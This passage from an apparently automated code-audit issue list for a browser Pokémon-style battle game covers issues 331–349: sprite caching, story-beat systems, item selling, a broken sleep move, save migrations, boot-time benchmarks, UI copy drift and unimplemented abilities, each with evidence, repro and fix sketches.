The 4 canonical rival fights map to phases {0,2,3,4}. `pickRivalSecondaryIntroLine` and `RIVAL_PROGRESS_PRIMARY_QUOTES` both define a complete phase-1 line pool that is unreachable for any real rival fight (it only surfaces via the `pools[phase] || pools[1]` fallback default). Not a player-visible bug, but it means a written dialogue tier is dead and the phase numbering is non-obvious for future authors.

**Repro**: Grep callers of `getRivalEncounterPhase` — no path yields 1.

**Blast radius**: Dialogue authoring clarity; ~6 written lines unused.

**Fix sketch**: Either remap EARLY→1 (and shift MID→2, LEAGUE→3/4) for a contiguous enum, or document why the gap exists and fold the phase-1 pool into phase 2. Coordinate with pasteur (dialogue/phase owner).

**Verification**: Every defined phase pool is reachable, or the gap is documented.

---

## <a id="ISSUE-331"></a> ISSUE-331: Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session

---
id: ISSUE-331
severity: P3
category: perf
anchor_symbol: getSprite
current_line_hint: 12726
file: battle.html
agents: [performance-profiler]
fingerprint: 92e4f7817cc9
confidence: medium
status: open
---

**Title**: Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session

**Evidence**:
```js
// battle.html:12616
const _preloadedImages = {};
// battle.html:12726
if (!_preloadedImages[url]) {
    let img = new Image(); img.src = url; _preloadedImages[url] = img;
}
```
(Lines drifted from the prior profiler's 11983/12036 cite; the unbounded pattern is unchanged.) This cache lives in the browser image-decoder pool, NOT the V8 heap, so it does not appear in `process.memoryUsage()` — the jsdom memory benchmark above cannot see it, which is exactly why it needs to be called out separately at this review gate.

**Repro**: `grep -n _preloadedImages battle.html` shows one declaration + one assignment-in-loop; no eviction logic. A full story sees 100–300 unique mons; × shiny/back variants → 500+ cached Images on a long save.

**Blast radius**: Forward-looking, and amplified by the redesign: a **daycare with per-run egg state** plus the **Fight Club gauntlet** will surface many more distinct species per session (eggs hatch new mons; gauntlet draws wide rosters). At ~5–50 KB per Showdown GIF, 500+ entries ≈ 10–25 MB of pinned image data — a real OOM contributor on low-RAM mobile.

**Fix sketch**: Convert `_preloadedImages` to a bounded LRU (~100 entries) or drop the explicit `new Image()` preload entirely — appended `<img src>` elements are cached by the browser automatically, so the Image() instances duplicate the cache.

**Verification**: In a long browser session, confirm `Object.keys(_preloadedImages).length` plateaus at the cap instead of growing monotonically.

---

## <a id="ISSUE-332"></a> ISSUE-332: Two disjoint "beat" systems — row-id `STORY_BEATS` (cold-opens) vs sceneKey `*_STORY_BEATS` (3-track)

---
id: ISSUE-332
severity: P3
category: refactor
anchor_symbol: getStoryBeatForRow
current_line_hint: ~41884
file: battle.html
agents: [story-mode-investigator]
fingerprint: ac151dae7911
confidence: high
status: open
---

**Title**: Two disjoint "beat" systems — row-id `STORY_BEATS` (cold-opens) vs sceneKey `*_STORY_BEATS` (3-track)

**Evidence**:
```js
// System A — keyed by ROW ID, drives cold-opens + variant beatOverrides:
getStoryBeatForRow(rowId, ev) → { ...derived, ...STORY_BEATS[rid], ...variant.beatOverrides[rid] }
//   STORY_BEATS = { 68:{coldOpen:'introRival'}, 5..53 gymLeader, 67:{coldOpen:'mystery67'} }
//   STORYLINE_VARIANTS.classic.beatOverrides = { 7:'classic_gym1', 26:'classic_gym4', 56:'classic_gym8', 64:'classic_champion', … }
// System B — keyed by sceneKey + roadAnchor, drives the 3-track event/battle/boss/raid beats:
//   MAIN/VILLAIN/EXTRA_STORY_BEATS → _resolveActiveRoadBeats / _activeBattleBeatForCurrentRow
// The two never reconcile: a row can have a cold-open (System A) AND road beats (System B) with no shared ordering.
```

**Repro**: Read `getStoryBeatForRow` (System A, cold-opens, row-id) vs `_resolveActiveRoadBeats`/`_activeBattleBeatForCurrentRow` (System B, sceneKey/road). enterBattleEvent runs the System-A cold-open first, then (separately) the System-B battle-beat scene; processNextEvent runs System-B event-beats before either. Three independent scene sources feed one battle entry with no unified order.

**Blast radius**: Maintainability + the desync class root. The fragmentation is why preview can't be derived from dispatch (two beat models + the interrupt chain). Directly motivates STORY_OVERHAUL_PLAN §4's "ONE canonical event model / ONE dispatcher."

**Fix sketch**: Long-term, merge into one declarative ordered event list per row/road consumed by a single dispatcher + a single peek (preview). Short-term, document the precedence (System-B event beats → System-A cold-open → interrupts → System-B battle beat → fight) in one place and assert it in a test.

**Verification**: One model resolves "what happens at row N" for both preview and dispatch; the cold-open and 3-track layers are unified or have a single documented, tested ordering.

---

## <a id="ISSUE-333"></a> ISSUE-333: Featured Mega/Ultra stones (bought one-per-city at 5x/3x) are sellable from the bag at half list price

---
id: ISSUE-333
severity: P3
category: dx
anchor_symbol: getStoryFeaturedItems
current_line_hint: ~52715
file: battle.html
agents: [story-mode-investigator]
fingerprint: d751963ad1f8
confidence: low
status: open
---

**Title**: Featured Mega/Ultra stones (bought one-per-city at 5x/3x) are sellable from the bag at half list price

**Evidence**:
```js
// openCityBag: allItems includes getStoryFeaturedItems() (mega_/ultra_ ids, price=base*5 / base*3)
const sellPrice = Math.floor(item.price / 2);   // mega -> floor(base*5/2)
// rendered Sell button -> sellItem('mega_<id>', sellPrice)
```

**Repro**: Buy a featured Mega stone (locks city via deptShopPurchasedByCity), open Bag → stone shows a Sell button. Selling does NOT unlock the city → no re-buy loop → no exploit, but a player can accidentally sell a needed Mega Stone at a net loss.

**Blast radius**: Footgun, not an economy exploit (sell < buy, lock persists). Design-intent question.

**Fix sketch**: Suppress the Sell button for featured mega_/ultra_ ids in openCityBag (treat like PERM_BOOST_IDS), or confirm intent. No number change.

**Verification**: Featured stones render without a Sell button (or behind a confirm).

---

## <a id="ISSUE-334"></a> ISSUE-334: Grass Whistle never puts the target to sleep

---
id: ISSUE-334
severity: P3
category: bug
anchor_symbol: Grass Whistle
current_line_hint: ~19082
file: battle.html
agents: [test-coverage-filler]
fingerprint: bac185d08e2a
confidence: high
status: open
---

**Title**: Grass Whistle never puts the target to sleep

**Evidence**:
```text
Grass Whistle appears only in sound-move sets (battle.html:19082 SUM_SOUND_MOVES, 19401, 19685, 23247);
there is no path that applies SLP for it. Sister sleep moves (Spore/Sleep Powder/Hypnosis/Sing/Lovely Kiss) all work.
```

**Repro**: jsdom harness, seed-sweep 0..59 (manual setup + seedRng(seed) + playTurn), Mew Grass Whistle vs Snorlax — d.status never becomes SLP. The same sweep lands every other sleeper within a few seeds.

**Blast radius**: Grass Whistle is a dead sleep move (55% acc; should sleep). Niche, low story impact.

**Fix sketch**: Wire Grass Whistle into the same sleep-application path as Sing / Grass Whistle's siblings (it is sound-based, so also check Soundproof immunity).

**Verification**: seed-sweep lands SLP within ~10 seeds (mirrors the Sing assertion in status-infliction draft).

---

## <a id="ISSUE-335"></a> ISSUE-335: CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3)

---
id: ISSUE-335
severity: P3
category: bug
anchor_symbol: GYM_CITY_LEADER_EVENT
current_line_hint: ~29743
file: battle.html
agents: [story-mode-investigator]
fingerprint: da9a1c34d71e
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3)

**Evidence**:
```js
const GYM_CITY_LEADER_EVENT = (function buildGymCityLeaderMap() {
    const out = {};
    for (let i = 0; i < STORY_EVENTS_RAW.length; i++) {
        const row = STORY_EVENTS_RAW[i];
        if (!row || row[1] !== 'Battle') continue;
        const m = String(row[2] || '').match(/^Gym Leader (\d+)$/);
        if (m) out[parseInt(m[1], 10)] = i;
    }
    return out;
})();
```

**Repro**: Prior audit finding 1.3 flagged `GYM_CITY_LEADER_EVENT` as a hard-coded index map fragile to timeline shifts. It is now an IIFE that derives the map by scanning `STORY_EVENTS_RAW` for `Gym Leader N` rows (29743). Used at 38514 + 39330 for hub label/sprite. Timeline-shift-safe.

**Blast radius**: Tier-1 #6 — resolved. The hard-code is gone (not merely shadow-validated; fully derived).

**Fix sketch**: None — confirms the prior P1 is fixed.

**Verification**: Map indices match the array positions of the 8 `Gym Leader N` rows.

---

## <a id="ISSUE-336"></a> ISSUE-336: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

---
id: ISSUE-336
severity: P3
category: data
anchor_symbol: isPokeball
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 92eb6f313f92
confidence: high
status: wontfix-isPokeball-flag-future-use-forward-compat
---

**Title**: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

**Evidence**:
```bash
$ grep -n "isPokeball\|isPokeBall" battle.html
# (no matches)
$ grep -c "isPokeball" data/items.json
28
```

**Repro**: `grep -nE "isPokeball|isPokeBall" /home/user/battle/battle.html` returns no lines (note: the mandate's spelling is `isPokeBall` with uppercase B, but the actual data uses `isPokeball`). The engine's ball-handling code uses its own `ballKey: 'master' | 'great' | ...` taxonomy in `POKEMART_ITEMS` rows, not the data-file flag.

**Blast radius**: None at runtime — the flag is just inert bytes in the JSON. It's a low-priority data-hygiene concern: future contributors may add a poke-ball entry and forget the (unused) flag, or be confused about which catalog is authoritative. Doc/maintenance friction only.

**Fix sketch**: Either (a) strip the `isPokeball` field from `data/items.json` as part of a periodic data-cleanup pass; or (b) wire the engine's ball-detection helpers (e.g., `_ballChip` flows, `applyBallMultiplier`) to read from the data file's `isPokeball` instead of the ad-hoc `kind:'ball'` rows in `POKEMART_ITEMS`. Option (b) consolidates ball-knowledge into one place but is a non-trivial refactor; option (a) is a one-liner script.

**Verification**: After (a): `grep -c isPokeball data/items.json` returns 0. After (b): boot a wild encounter, throw a Quick Ball at turn 1 — confirm the multiplier still triggers via the new lookup path.

---

## <a id="ISSUE-337"></a> ISSUE-337: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

---
id: ISSUE-337
severity: P3
category: data
anchor_symbol: items.json
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 3ebf781a4419
confidence: medium
status: wontfix-gen2-berries-not-loaded-by-gen9-engine-by-design
---

**Title**: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

**Evidence**:
```js
// items.json gen 9 entries — all marked isNonstandard:"Past":
// bitterberry, burntberry, goldberry, iceberry, mintberry, miracleberry,
// mysteryberry, przcureberry, psncureberry
$ grep -E "Bitter Berry|Burnt Berry|Gold Berry|Ice Berry|Mint Berry|Miracle Berry|Mystery Berry|PRZ Cure Berry|PSN Cure Berry" battle.html
# (no matches)
```

**Repro**: Iterate `data/items.json` flat for `isBerry: true`; for each berry name, grep `battle.html`. 68 of 77 distinct berries have at least one name reference (Sitrus, Lum, Salac, Liechi, ...). The remaining 9 are all `isNonstandard: "Past"` entries that were renamed/replaced in gen3+ (Gold Berry → Sitrus Berry, etc.).

**Blast radius**: None today — these berries cannot be held in the gen9-only engine path. The risk is purely hypothetical (a future "play gen2 OU" mode would silently no-op them). The dataset is internally consistent with the `isNonstandard:"Past"` marker.

**Fix sketch**: Optional cleanup — keep them as documented past-only data; or, if a multi-gen toggle is ever added, ship a name-aliasing table mapping legacy berries to their modern equivalents in the engine's berry handler. No action required today.

**Verification**: Decide whether to keep or alias; the current `isNonstandard:"Past"` is correctly signalling "do not instantiate."

---

## <a id="ISSUE-338"></a> ISSUE-338: `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer`

---
id: ISSUE-338
severity: P3
category: bug
anchor_symbol: load
current_line_hint: ~30896
file: battle.html
agents: [story-mode-investigator]
fingerprint: 35349ce088b7
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer`

**Evidence**:
```js
// battle.html ~30896
// v20: casino runs on gold directly. Drop the legacy coin
// currency silently from old saves.
try { delete sm.casinoCoins; } catch (e) {}
if (!sm.casinoStats || typeof sm.casinoStats !== 'object') sm.casinoStats = {};
try { delete sm.casinoStats.cashier; } catch (e) {}
try { delete sm.profIntroThemePending; } catch (e) {}
```
The pattern is "delete on every load whether or not the field exists". Works correctly because `delete` is idempotent, but is structurally different from the explicit `if (_loadedVer < N)` blocks below it. SAVE_VER is not bumped either (see related fingerprint `1877fb707d44`).

**Repro**: Inspect lines 30896-30901 vs lines 30943-30957. Same kind of operation, different style.

**Blast radius**: DX-only. The implicit `delete` calls are silent and bypass the visible migration ledger.

**Fix sketch**: Wrap in `if (_loadedVer < 20) { ... }` block + bump SAVE_VER. Or, if intentional eternal cleanup, add a comment explaining why these four fields don't follow the `_loadedVer < N` pattern.

**Verification**: After fix, the migration chain reads cleanly from v8 → v20 with no out-of-band deletes.

---

## <a id="ISSUE-339"></a> ISSUE-339: CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss

---
id: ISSUE-339
severity: P3
category: bug
anchor_symbol: load
current_line_hint: ~32544
file: battle.html
agents: [story-mode-investigator]
fingerprint: a523f2cc0e8d
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss

**Evidence**:
```
PROBE6 (jsdom __storyLoad): from version {8,13,14,15,16,19} → all newVer=21, threw=null, ok=true,
team preserved (Pikachu,Charizard), PC preserved, badges/gold/balls intact, IVs backfilled to 31,
permBoosts refunded as vitamins (atk:2 → protein:2), v8 eventIndex correctly +1 shifted (10→11).
```

**Repro**: `window.__storyLoad()` with `{version:N,...}` for N in 8..19 (see PROBE6). Each `_loadedVer < K` gate fires in strict ascending order (v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20,v21 — the prior P1 about v13/v14 ordering and the v14-skip-at-exactly-v13 are both resolved: v14 is its own `< 14` block). load() wraps each migration in try/catch, clamps eventIndex, validates/drops malformed currentEnemyLock, and on a hard parse failure backs up the raw blob to `pbs_story_save.broken.latest` (BUG-005) instead of silently overwriting.

**Blast radius**: None — this is a positive confirmation that Tier-1 save-migration completeness holds. Recorded so the orchestrator can close the migration concern.

**Fix sketch**: No fix needed. (The only adjacent gap is the v21 egg migration reinterpreting a pre-v21 badge-count as a city index — documented as the deliberate "City N ≈ Gym N" approximation; legacy eggs may hatch a touch earlier than the old Gym-7 gate, which is benign.)

**Verification**: `npm run test:integration` save-migration suite (now exercises real `__storyLoad`, not vacuous JSON round-trip).

---

## <a id="ISSUE-340"></a> ISSUE-340: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

---
id: ISSUE-340
severity: P3
category: perf
anchor_symbol: loadEngine
current_line_hint: 52
file: tests/helpers/load-engine.js
agents: [performance-profiler]
fingerprint: 28e451a73726
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

**Evidence**: `tests/reports/perf.md` (this run, ISO 2026-05-22T07:18:54Z) reports `Cold start: 2854 ms (target: < 5000 ms in jsdom)`. Repeated trial: 2885 ms. The performance-profiler mandate (`agents/performance-profiler.md` line 17) sets the target at **< 200 ms under jsdom**. The harness self-report in `perf-bench.mjs:112` has been silently relaxed to `< 5000 ms` to mask this.

**Repro**: `time node -e 'import("./tests/helpers/load-engine.js").then(m => m.loadEngine()).then(() => console.log("ok"))'` measures ≈ 3 seconds.

**Blast radius**: The mandate's 200 ms target is unrealistic — jsdom has to parse ~50k lines of inlined battle.html, then the engine `loadGameData` synchronously parses 1380 species, 954 moves, 583 items, 314 abilities, 1147 build entries from JSON/CSV. The real bottleneck is JSON.parse + JSDOM document construction, both of which are largely fixed-cost. **Either the target needs updating** (the harness self-report at < 5 s is more realistic for jsdom) **or the engine should split eager loading into lazy/on-demand parsing**. In production browsers the boot is ~1.5–2 s and is hidden behind a splash; this is not user-visible. So this is a **target-mismatch finding**, not a performance regression: clarify which number the project actually targets.

**Fix sketch**: Either (a) update `agents/performance-profiler.md` to set the realistic target at `< 5 s in jsdom / < 2.5 s in production`, or (b) add a flag to `loadGameData` to skip parsing of unused data tables (e.g., the 748 illegal/end-game builds) during test boot.

**Verification**: Either the mandate target is updated to a realistic value, or `loadGameData` gains a `{ lazyBuilds: true }` option and `loadEngine.js` passes it.

---

## <a id="ISSUE-341"></a> ISSUE-341: Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed

---
id: ISSUE-341
severity: P3
category: dx
anchor_symbol: loadEngine
current_line_hint: ~48385
file: tests/helpers/load-engine.js
agents: [story-mode-investigator]
fingerprint: 05d7604f22a5
confidence: high
status: open
---

**Title**: Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed

**Evidence**:
```
PROBE: win_sm=false, win_newStoryRun=undefined, win_SAVE_VER=undefined
Exposed instead: window.StoryMode (incl .state getter), window.STORY_EVENTS_RAW,
window.storyRngNext, window.__storyLoad, window.__STORY_SAVE_VER
```

**Repro**: `loadEngine()` then read `window.SAVE_VER` → undefined; `window.sm` → undefined; `window.newStoryRun` → undefined. The `inspect-save` skill, this agent's charter, and `run-engine-test` notes all instruct using `window.sm` / `window.SAVE_VER` / `window.newStoryRun`. The real surface is `window.StoryMode.state` (for sm), `window.__STORY_SAVE_VER` (for SAVE_VER), `window.__storyLoad` (for the load/migration entry). New runs go through `StoryMode.startNewRun`, not a `window.newStoryRun`.

**Blast radius**: Every save/story repro a future agent or maintainer writes against the documented names silently no-ops or early-returns (the existing story-flow tests defensively `if (!window.sm) return;` — they pass vacuously when the global is absent). Wastes investigation time.

**Fix sketch**: Either expose the documented aliases on `window` behind the `__testHarness` flag (`window.sm = sm` getter, `window.SAVE_VER = SAVE_VER`, `window.newStoryRun = startNewRun`), or update the skill docs + charter to the real names (`StoryMode.state`, `__STORY_SAVE_VER`, `__storyLoad`). The first is lower-friction for repro authors.

**Verification**: `loadEngine()` → `typeof window.SAVE_VER === 'number'` and `window.sm === window.StoryMode.state`.

---

## <a id="ISSUE-342"></a> ISSUE-342: `console.log` cluster in battle.html — debug noise in shipped code

---
id: ISSUE-342
severity: P3
category: dx
anchor_symbol: loadGameData
current_line_hint: ~9172
file: battle.html
agents: [consistency-auditor]
fingerprint: 2665d2131c90
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `console.log` cluster in battle.html — debug noise in shipped code

**Evidence**:
```js
// 19 console.log sites in battle.html — most under window.__DEBUG_* gates or under
// dev-only seeders. Worst-offender (always-on) sites:
// L9082  console.log('[SpriteScale] enrichBaseStatsHeightsFromDex: heightM added for ' + n + ' species');
// L9172  console.log(`[Data] Loaded ${...} species, ${...} moves, ${...} items, ${...} abilities, ${...} natures`);
// L9342  console.log(`[CSV] Loaded builds for ${Object.keys(csvBuilds).length} Pokémon ...`);
// L9399  console.log(`[CSV] API fallback loaded builds for ${...}`);
// L10939 console.log(`[Smogon] Loaded gen${gen} sets from local file`);
// L10945 console.log(`[Smogon] Loaded gen${gen} sets from pkmn.cc API`);
```

**Repro**: Open battle.html in a browser, open the console — `[Data] Loaded …` and friends greet every visitor on every cold load.

**Blast radius**: Polish only. Shipped console noise distracts from real diagnostics during incident triage. Note: console.log entries inside `__storyXxxTest` / `seedStoryXxx` / `balanceAudit` / `testmoves` are intentional (dev seeders) and should NOT be stripped.

**Fix sketch**: Gate the 5-6 always-on data-load logs behind a `window.__DEBUG_LOADS` flag (the SpriteScale / dex probe pattern already does this — copy it). Keep the dev-seeder logs as-is.

**Verification**: Cold load battle.html in a browser, console should be empty unless `?debug=1` or `__DEBUG_LOADS=true`.

---

## <a id="ISSUE-343"></a> ISSUE-343: Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression

---
id: ISSUE-343
severity: P3
category: perf
anchor_symbol: loadGameData
current_line_hint: 9583
file: battle.html
agents: [performance-profiler]
fingerprint: 56169fe009c6
confidence: high
status: open
---

**Title**: Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression

**Evidence**: 5 fresh node processes: 3270, 3018, 2934, 3009, 3034 ms → median **3009 ms**. Dominated by JSDOM parsing ~48k lines of inlined battle.html + `loadGameData` synchronously parsing species.json (1380), moves.json (954), items.json, abilities.json, and builds.csv. The mandate (performance-profiler) sets < 200 ms; `perf-bench.mjs` self-reports against a relaxed < 5000 ms.

**Repro**: `time node -e 'import("./tests/helpers/load-engine.js").then(m=>m.loadEngine())'` ≈ 3 s, repeatable.

**Blast radius**: jsdom boot is mostly fixed-cost (document construction + JSON.parse) and is hidden behind a splash in production (~1.5–2 s real browser). Not user-facing. The redesign adds more eager data (egg tables, gauntlet rosters, story-pool) — every new JSON table parsed at boot adds to this synchronous path, so the boot budget is worth watching. Flagging as a target-clarity issue + a budget to protect.

**Fix sketch**: Either update the mandate to a realistic jsdom target (< 5 s) / production target (< 2.5 s), or add lazy/on-demand parsing to `loadGameData` (e.g. defer the ~748 illegal/end-game build rows and any new redesign tables until first use) so boot stays flat as data grows.

**Verification**: Re-measure 5-process median; confirm it stays under whichever target the project ratifies, and that adding redesign data tables does not push it past budget.

---

## <a id="ISSUE-344"></a> ISSUE-344: Grade badge prefix differs — `G{tier}` on draft cards vs `T{grade}` on swap/daycare slots

---
id: ISSUE-344
severity: P3
category: inconsistency
anchor_symbol: makeActionBtn
current_line_hint: ~16580
file: battle.html
agents: [consistency-auditor]
fingerprint: 4dca97446477
confidence: high
status: open
---

**Title**: Grade badge prefix differs — `G{tier}` on draft cards vs `T{grade}` on swap/daycare slots

**Evidence**:
```js
// 16580 / 28634 / 28674 (Professor draft): <span class="tier-badge bg-tier-${tier}">G${tier}</span>
// 43748 / 44066 / 44212 (swap/daycare/MF):  <span ...>T${grade}</span>
// 44749: <span class="tier-badge bg-tier-${g}" title="Power tier...">T${g}</span>
```

**Repro**: grep -nE "G\${tier}|T\${grade}" battle.html — same underlying grade value, two letter prefixes, same bg-tier CSS class.

**Blast radius**: Player sees "G3" on the Professor pick and "T3" on the Daycare/swap for the same power band. Also "G" collides with the gold suffix (`amount + 'G'`).

**Fix sketch**: Pure-text. Pick one prefix (the CSS class is `tier-badge`/`bg-tier-N`, so "T#" is the more consistent choice and frees "G" for gold). Sweep all 8 sites.

**Verification**: One prefix everywhere a grade/tier badge renders.

---

## <a id="ISSUE-345"></a> ISSUE-345: Button label patterns inconsistent — Professor uses verb+noun, all others noun-only; Evolution facility has 3 names

---
id: ISSUE-345
severity: P3
category: inconsistency
anchor_symbol: makeActionBtn
current_line_hint: ~42945
file: battle.html
agents: [consistency-auditor]
fingerprint: 7c871a337924
confidence: high
status: open
---

**Title**: Button label patterns inconsistent — Professor uses verb+noun, all others noun-only; Evolution facility has 3 names

**Evidence**:
```js
// Noun-only: 'Move Tutor', 'Battle Dojo', 'Nature Rater', 'EV Trainer', 'Game Corner', 'Relic Annex'
// Verb+noun: 'Professor — Swap a Team Member'
// Evolution facility: action-list 'Evolution Tutor' (30046) | screen head 'Evolution Tutor' (9112)
//                     | button _npcStageName('evolab') = 'Evolution Teacher'/'Evolution Master' (53902)
```

**Repro**: scan city action buttons in one playthrough; Professor reads as an instruction, siblings as place names; the Evolution facility's button title differs from its screen title.

**Blast radius**: Reads as drift. Emoji prefixes ARE consistent (every facility has one). Pure-text.

**Fix sketch**: Decide one convention (recommend noun-only place names) and align the Professor label + the Evolution facility's three names to a single display string.

**Verification**: All facility buttons follow one verb/noun convention; Evolution facility shows one name in button + header.

---

## <a id="ISSUE-346"></a> ISSUE-346: Empty-state copy varies across facilities for the same "no party member" condition

---
id: ISSUE-346
severity: P3
category: inconsistency
anchor_symbol: makeActionBtn
current_line_hint: ~47531
file: battle.html
agents: [consistency-auditor]
fingerprint: 5ccebd126a71
confidence: high
status: open
---

**Title**: Empty-state copy varies across facilities for the same "no party member" condition

**Evidence**:
```
47531: "No Pokémon in your party. Visit the Professor or withdraw from..."
51998: "No Pokémon in your party. Visit the Professor to get one."
58750: "No Pokémon in your party. Visit the Professor first."
51532 / 57436 / 57984 / 58996: "No Pokémon in your party."  (no CTA)
52827 / 52925: "No party mons."     38613: "No team data."
```

**Repro**: open each facility with an empty party; trailing CTA + phrasing differ per screen.

**Blast radius**: Voice drift; "No party mons." / "No team data." read as dev-stub copy next to the polished strings. Pure-text.

**Fix sketch**: Single shared empty-party helper string (one phrasing + one CTA). Replace "No party mons."/"No team data." with it.

**Verification**: Every empty-party facility shows identical copy.

---

## <a id="ISSUE-347"></a> ISSUE-347: 7 build abilities (Telepathy/Mountaineer/Friend Guard/Healer/Pickup/Rebound/Symbiosis) are silent no-ops the engine never implements

---
id: ISSUE-347
severity: P3
category: data
anchor_symbol: makeBuild
current_line_hint: ~10868
file: data/builds/gen5.json
agents: [data-integrity-auditor]
fingerprint: 7a62964308d8
confidence: high
status: open
---

**Title**: 7 build abilities (Telepathy/Mountaineer/Friend Guard/Healer/Pickup/Rebound/Symbiosis) are silent no-ops the engine never implements

**Evidence**:
```json
// data/builds/gen5.json — Wobbuffet/ou/"Death Fodder"
"ability": "Telepathy"
// data/builds/gen4.json — Syclant/cap/"Choice Band"
"ability": "Mountaineer"
```
These 7 ability names exist in `data/abilities.json` but their literal strings appear **nowhere** in `battle.html` (verified by full-text search) — no `mon.ability === "..."`, no lookup-map key, no `.includes()`. The engine loads only gen9 builds, and when `makeBuild` rolls one of these slots the ability is a cosmetic label with zero mechanical effect.

**Repro**: `node -e` over `data/builds/*.json` collecting `ability` values, then grep each literal in `battle.html`: Telepathy (23 builds), Mountaineer (16), Friend Guard (6), Healer (5), Pickup (2), Rebound (2), Symbiosis (2) — 56 build-slots total, 0 hits each in the engine.

**Blast radius**: Low. Telepathy/Friend Guard/Healer/Symbiosis are doubles-only (inert in this singles engine anyway); Mountaineer/Rebound are CAP-only (Rock/Ground switch-in immunity and a Magic-Bounce clone — genuinely missing on Syclant/Colossoil CAP sets); Pickup is field-only. No crash; the mon just battles as if abilityless for that trait. Contrast with the otherwise-thorough 275-ability coverage (Rock Head, Shield Dust, type-resist berries, etc. are all handled via maps).

**Fix sketch**: Either (a) implement the two competitively-relevant ones (Mountaineer switch-in immunity in the type-immunity path near `abilityImmunity`; Rebound alongside `Magic Bounce`) and accept the doubles-only ones as inert, or (b) document these as known-inert and have `makeBuild`/the tutor pool prefer an implemented co-slot ability when one exists. No data edit required.

**Verification**: After (a), a Syclant holding Mountaineer takes 0 from a switch-in Stealth Rock / first Ground or Rock hit; grep `battle.html` for "Mountaineer" and "Rebound" returns engine hits. After (b), rolled builds never surface an unimplemented ability when a legal implemented alternative exists.

---

## <a id="ISSUE-348"></a> ISSUE-348: `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median

---
id: ISSUE-348
severity: P3
category: perf
anchor_symbol: makeBuild
current_line_hint: ~10731
file: battle.html
agents: [performance-profiler]
fingerprint: d17c754c4af6
confidence: medium
status: open
---

**Title**: `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median

**Evidence**: T1-T4 means STANDARD / MEGA / TERA / ZMOVE in current code (the `forceGimmick` knob). 10 species × 5 trials each, jsdom harness, `window.__rivalTest.makeBuild`:

| Tier    | n  | Median ms | p95 ms | Max ms | Mean ms |
|---------|----|-----------|--------|--------|---------|
| STANDARD| 50 |     0.045 |  0.257 |  0.686 |   0.088 |
| MEGA    | 50 |     0.014 |  0.028 |  0.104 |   0.018 |
| TERA    | 50 |     0.020 |  0.036 |  0.085 |   0.022 |
| ZMOVE   | 50 |     0.015 |  0.047 |  0.057 |   0.019 |

```js
// battle.html:10731 — gimmick pool is selected via simple object lookup, no per-tier branch difference
if (gimmick === 'MEGA') pool = entry.mega?.length ? entry.mega : [];
else if (gimmick === 'ZMOVE') pool = entry['z-attack']?.length ? entry['z-attack'] : [];
else if (gimmick === 'TERA') pool = entry.tera?.length ? entry.tera : [];
else pool = (entry.regular || []).concat(entry.weather || []);
```

**Repro**: `/tmp/deep-perf2.mjs`, 2026-05-28.

**Blast radius**: A 6-mon team build = 6 `makeBuild` calls ≈ 0.27 ms total. Inside `rollTrainerTeam`'s ~1.4 ms cold call. Negligible. STANDARD's higher max (0.69 ms) comes from the `csvBuildMix` 70/30 designed-vs-CSV split that runs an extra `makeDesignedBuild` lookup on ~30% of calls. The cost is even across tiers, so the mandate's "should be flat across tiers" check passes.

**Fix sketch**: No fix needed. This finding exists to establish the T1-T4 baseline so future regressions are detectable.

**Verification**: Re-bench after any change to `makeBuild`'s pool selection; flag if a tier diverges from the others by >2× median.

---

## <a id="ISSUE-349"></a> ISSUE-349: v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17)

---
id: ISSUE-349
severity: P3
category: dx
anchor_symbol: migrateStoryPreV15
current_line_hint: ~30605
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6aecb8bc20ed
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17)

**Evidence**:
```js
// battle.html ~30605  migrateStoryPreV15
if (Array.isArray(sm.team)) {
    for (const slot of sm.team) {
        if (slot && typeof slot === 'object' && !slot.id) {
            slot.id = 'm_' + Math.random().toString(36).slice(2, 10);
        }
    }
}
// no sm.pcBox iteration

// battle.html ~30633  migrateStoryPreV17 (later fix)
for (const arr of [sm.team, sm.pcBox]) {
    if (!Array.isArray(arr)) continue;
    for (const slot of arr) {
        if (slot && typeof slot === 'object' && !slot.id) {
